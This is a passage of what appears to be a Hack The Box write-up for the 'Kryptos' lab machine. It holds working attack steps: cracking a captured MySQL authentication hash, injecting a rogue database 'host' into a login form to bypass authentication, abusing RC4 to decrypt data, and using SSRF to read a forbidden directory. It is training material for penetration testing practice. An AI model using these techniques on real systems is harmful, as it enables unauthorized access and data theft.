<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# cat hash_mysqlna </span><br><span class="line">dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt .&#x2F;hash_mysqlna </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32&#x2F;64])</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">krypt0n1te       (dbuser)</span><br><span class="line">1g 0:00:00:03 DONE (2019-09-12 22:15) 0.3184g&#x2F;s 2054Kp&#x2F;s 2054Kc&#x2F;s 2054KC&#x2F;s kryptic11..kry007</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>
<p>Database name : <code>cryptor</code></p>
<p>Username : <code>dbuser</code></p>
<p>Password : <code>krypt0n1te</code><br>Now we need to create the database, create the database user <code>dbuser</code> and grant them permission to the database <code>cryptor</code> :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/kryptos<span class="comment"># mysql</span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MariaDB connection id is 38</span><br><span class="line">Server version: 10.3.14-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type '<span class="keyword">help</span>;' or '\h' for help. <span class="keyword">Type</span> <span class="string">'\c'</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">show</span> <span class="keyword">databases</span>;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.002</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">create</span> <span class="keyword">database</span> cryptor;</span><br><span class="line">Query OK, 1 row affected (0.025 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| Database           |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| cryptor            |</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">use</span> cryptor;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [cryptor]&gt; grant all privileges on *.* to 'dbuser'@'%' identified by 'krypt0n1te';</span><br><span class="line">Query OK, 0 rows affected (0.133 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [cryptor]&gt;</span><br></pre></td></tr></table></figure>
<p>Let’s test it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# mysql -u dbuser -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 39</span><br><span class="line">Server version: 10.3.14-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; use cryptor;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [cryptor]&gt; show tables;</span><br><span class="line">Empty set (0.001 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [cryptor]&gt;</span><br></pre></td></tr></table></figure>
<p>It’s working, <code>dbuser</code> can login and access <code>cryptor</code>.<br>By default the server listens on <code>localhost</code> only, I changed <code>bind-address</code> in <code>/etc/mysql/mariadb.conf.d/50-server.cnf</code> from <code>127.0.0.1</code> to <code>0.0.0.0</code> then I restarted the service. </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# netstat -ntlp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID&#x2F;Program name</span><br><span class="line">tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      4110&#x2F;mysqld</span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      1&#x2F;init</span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      1&#x2F;init</span><br><span class="line">tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1971&#x2F;java</span><br></pre></td></tr></table></figure>


<h2 id="Authentication-Bypass-Getting-Login-Query"><a href="#Authentication-Bypass-Getting-Login-Query" class="headerlink" title="Authentication Bypass: Getting Login Query"></a>Authentication Bypass: Getting Login Query</h2><p>Now the server will be able to authenticate to the database as <code>dbuser</code>, however the login query will fail because the database is empty :<br>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: kryptos.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://kryptos.htb/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 133</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=99ub5git6oc7mka23ibjdorla2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">username=test&amp;password=test&amp;db=cryptor;host=10.10.xx.xx&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Thu, 12 Sep 2019 20:29:54 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.29 (Ubuntu)</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Vary</span>: Accept-Encoding</span><br><span class="line"><span class="attribute">Content-Length</span>: 966</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;title&gt;Cryptor Login&lt;/title&gt;</span><br><span class="line">  &lt;link rel="stylesheet" type="text/css" href="css/bootstrap.min.css"&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div class="container-fluid"&gt;</span><br><span class="line">&lt;div class="container"&gt;</span><br><span class="line">  &lt;h2&gt;Cryptor Login&lt;/h2&gt;</span><br><span class="line">  &lt;form action="" method="post"&gt;</span><br><span class="line">    &lt;div class="form-group"&gt;</span><br><span class="line">      &lt;label for="Username"&gt;Username:&lt;/label&gt;</span><br><span class="line">      &lt;input type="text" class="form-control" id="username" name="username" placeholder="Enter username"&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class="form-group"&gt;</span><br><span class="line">      &lt;label for="password"&gt;Password:&lt;/label&gt;</span><br><span class="line">      &lt;input type="password" class="form-control" id="password" name="password" placeholder="Enter password"&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;input type="hidden" id="db" name="db" value="cryptor"&gt;</span><br><span class="line">    &lt;input type="hidden" name="token" value="1a379390e91abff83331c45c58db799820077653e0c857312c8c64ea34d94028" /&gt;</span><br><span class="line">    &lt;button type="submit" class="btn btn-primary" name="login"&gt;Submit&lt;/button&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;div class="alert alert-danger"&gt;</span><br><span class="line">  Nope.&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>I ran <code>tcpdump</code> on <code>tun0</code> then I sent the login request again with these credentials : <code>rick:rick</code></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: kryptos.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://kryptos.htb/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 133</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=99ub5git6oc7mka23ibjdorla2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">username=rick&amp;password=rick&amp;db=cryptor;host=10.10.xx.xx&amp;token=04621e3945efee9172f45070c43020e6615cccc81d5cc3d69f5e6f93a53321e2&amp;login=</span><br></pre></td></tr></table></figure>
<p><code>tcpdump</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# tcpdump -i tun0 -w cap.pcap</span><br><span class="line">tcpdump: listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes</span><br><span class="line">^C27 packets captured</span><br><span class="line">27 packets received by filter</span><br><span class="line">0 packets dropped by kernel</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos#</span><br></pre></td></tr></table></figure>
<p>Then I opened the <code>pcap</code> file in <code>wireshark</code> and got the query :<br><img src="/images/hackthebox/kryptos/4.png" alt=""></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'rick'</span> <span class="keyword">AND</span> <span class="keyword">password</span>=<span class="string">'891f490e5d7bdb06d90d56f8d7db405f'</span></span><br></pre></td></tr></table></figure>


<h2 id="Authentication-Bypass-Setting-up-the-Database"><a href="#Authentication-Bypass-Setting-up-the-Database" class="headerlink" title="Authentication Bypass: Setting-up the Database"></a>Authentication Bypass: Setting-up the Database</h2><p>From the query now we know that we need to create a table called <code>users</code> with the columns <code>username</code> and <code>paassword</code>, we also know that the passwords are saved <code>md5</code> hashed as we saw for the password <code>rick</code> in the query :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> md5(<span class="string">"rick"</span>).hexdigest()</span><br><span class="line"><span class="number">891</span>f490e5d7bdb06d90d56f8d7db405f</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>I created the table <code>users</code> with the columns <code>username</code>, <code>password</code> :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/kryptos<span class="comment"># mysql</span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; or \g.</span><br><span class="line">Your MariaDB connection id is 43</span><br><span class="line">Server version: 10.3.14-MariaDB-1 Debian buildd-unstable</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type '<span class="keyword">help</span>;' or '\h' for help. <span class="keyword">Type</span> <span class="string">'\c'</span> <span class="keyword">to</span> <span class="keyword">clear</span> the <span class="keyword">current</span> <span class="keyword">input</span> statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]&gt; <span class="keyword">use</span> cryptor;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [cryptor]&gt; create table users ( username varchar(40) not null, password varchar(40) not null );</span><br><span class="line">Query OK, 0 rows affected (0.409 sec)</span><br></pre></td></tr></table></figure>
<p>Then I inserted my credentials (<code>rick:rick</code>) :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [cryptor]&gt; insert into users ( username, password ) values ( &#39;rick&#39;, &#39;891f490e5d7bdb06d90d56f8d7db405f&#39; );                                                                                                </span><br><span class="line">Query OK, 1 row affected (0.149 sec)</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [cryptor]&gt; show tables;</span><br><span class="line">+<span class="comment">-------------------+</span></span><br><span class="line">| Tables_in_cryptor |</span><br><span class="line">+<span class="comment">-------------------+</span></span><br><span class="line">| users             |</span><br><span class="line">+<span class="comment">-------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [cryptor]&gt; <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>;</span><br><span class="line">+<span class="comment">----------+----------------------------------+</span></span><br><span class="line">| username | password                         |</span><br><span class="line">+<span class="comment">----------+----------------------------------+</span></span><br><span class="line">| rick     | 891f490e5d7bdb06d90d56f8d7db405f |</span><br><span class="line">+<span class="comment">----------+----------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.103</span> sec)</span><br></pre></td></tr></table></figure>
<p>Let’s test the query :</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [cryptor]&gt; SELECT username, password FROM users WHERE username='rick' AND password='891f490e5d7bdb06d90d56f8d7db405f';</span><br><span class="line">+<span class="comment">----------+----------------------------------+</span></span><br><span class="line">| username | password                         |</span><br><span class="line">+<span class="comment">----------+----------------------------------+</span></span><br><span class="line">| rick     | 891f490e5d7bdb06d90d56f8d7db405f |</span><br><span class="line">+<span class="comment">----------+----------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.004</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [cryptor]&gt;</span><br></pre></td></tr></table></figure>
<p>It’s working.<br>Now we can simply go to the login page, edit the form input <code>id</code>  and inject the <code>host</code> parameter then login with <code>rick:rick</code>.</p>
<p><img src="/images/hackthebox/kryptos/5.png" alt=""></p>
<h2 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2><p>After getting in I got this application which had 2 pages, first one was to encrypt a file :<br><img src="/images/hackthebox/kryptos/6.png" alt=""><br>Second one was to decrypt a file but it was under construction :<br><img src="/images/hackthebox/kryptos/7.png" alt=""><br>The encryption page had two encryption methods, <code>AES-CBC</code> and <code>RC4</code>, I searched about <code>RC4</code> and read about it <a href="https://www.geeksforgeeks.org/rc4-encryption-algorithm/" target="_blank" rel="noopener">here</a>. As the article said, <code>RC4</code> is a stream cipher and it’s XOR based. The article also gave an example :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RC4 Encryption </span><br><span class="line">10011000 ? 01010000 &#x3D; 11001000    </span><br><span class="line"></span><br><span class="line">RC4 Decryption </span><br><span class="line">11001000 ? 01010000 &#x3D; 10011000</span><br></pre></td></tr></table></figure>
<p>As you can see, decryption and encryption are the exact same operation, which means that applying the encryption function on encrypted data will eventually decrypt that data if the key is the same used to encrypt it before. In other words, we can use the <code>RC4</code> encryption option in <code>encrypt.php</code> to encrypt and decrypt data. Let’s test it.<br>I created a file called <code>test.txt</code> with the word <code>test</code> in it, then I hosted it on a python server :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# echo test &gt; test.txt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http:&#x2F;&#x2F;0.0.0.0:80&#x2F;) ...</span><br></pre></td></tr></table></figure>
<p>Then I encrypted it :<br><img src="/images/hackthebox/kryptos/8.png" alt=""><br><img src="/images/hackthebox/kryptos/9.png" alt=""><br>It returned a base-64 encoded string, if we try to decode it we will get nothing readable because the data is encrypted :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# echo &#39;LFuc6DA&#x3D;&#39; | base64 -d </span><br><span class="line">,[0</span><br></pre></td></tr></table></figure>
<p>I decoded it and saved the result in another file and called it <code>test2.txt</code> then I ran the python server again :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# echo &#39;LFuc6DA&#x3D;&#39; | base64 -d &gt; test2.txt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# python3 -m http.server 80</span><br><span class="line">Serving HTTP on 0.0.0.0 port 80 (http:&#x2F;&#x2F;0.0.0.0:80&#x2F;) ...</span><br></pre></td></tr></table></figure>
<p>I applied the same encryption on the encrypted file :<br><img src="/images/hackthebox/kryptos/10.png" alt=""><br><img src="/images/hackthebox/kryptos/11.png" alt=""><br>And I got the original data decrypted :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# echo &#39;dGVzdAo&#x3D;&#39; | base64 -d</span><br><span class="line">test</span><br></pre></td></tr></table></figure>


<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>Great, we can encrypt and decrypt files, but reading our files isn’t really helpful. Earlier during the initial enumeration there was a forbidden directory <code>/dev</code>. When we provide a url to <code>/encrypt.php</code> to request a file and encrypt it the requests were made by the server, so I tested for server side request forgery :<br><img src="/images/hackthebox/kryptos/12.png" alt=""><br><img src="/images/hackthebox/kryptos/13.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# echo &#39;ZFab8VZUIV5qu5rKj1SWoME9ZBewRadWNQ4YR9dM&#x2F;657ZSgW9mfb4h2q32cxgq1+M67NnqRzOMvibBdA9jHboYr6oC+fzHibzR903NzgQBTbcJMhLkhQPRkVpQheiyKIY0NIhL1gwSXAlLTsXxtTDF&#x2F;RmUlTRvdraDyTHEb0slCruyQ+DUxVMbjR&#x2F;wmRfZcjP0l8t4XKSdOulLrHZskwsku1mIupShlgyyaRsvWXlbRbU32t4wMYrN7AZWTihxwSmNd+yaGQ85wh3RqJuBXLcFBb3HkM1A&#x3D;&#x3D;&#39; | base64 -d &gt; dev.enc</span><br></pre></td></tr></table></figure>
<p><img src="/images/hackthebox/kryptos/14.png" alt=""><br><img src="/images/hackthebox/kryptos/15.png" alt=""></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/kryptos# echo 'PGh0bWw+CiAgICA8aGVhZD4KICAgIDwvaGVhZD4KICAgIDxib2R5PgoJPGRpdiBjbGFzcz0ibWVudSI+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwIj5NYWluIFBhZ2U8L2E+CgkgICAgPGEgaHJlZj0iaW5kZXgucGhwP3ZpZXc9YWJvdXQiPkFib3V0PC9hPgoJICAgIDxhIGhyZWY9ImluZGV4LnBocD92aWV3PXRvZG8iPlRvRG88L2E+Cgk8L2Rpdj4KPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d                                                                           </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"menu"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>Main Page<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=about"</span>&gt;</span>About<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"index.php?view=todo"</span>&gt;</span>ToDo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">root@kali:~/Desktop/HTB/boxes/kryptos#</span><br></pre></td></tr></table></figure>
<p>It worked.<br>This process of “encryption –&gt; decoding and saving to a file –&gt; decryption –&gt; decoding” was a lot of steps and doing it manually through burp or the browser wasn’t efficient, so I wrote a script to automate it :<br><code>ssrf.py</code> :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 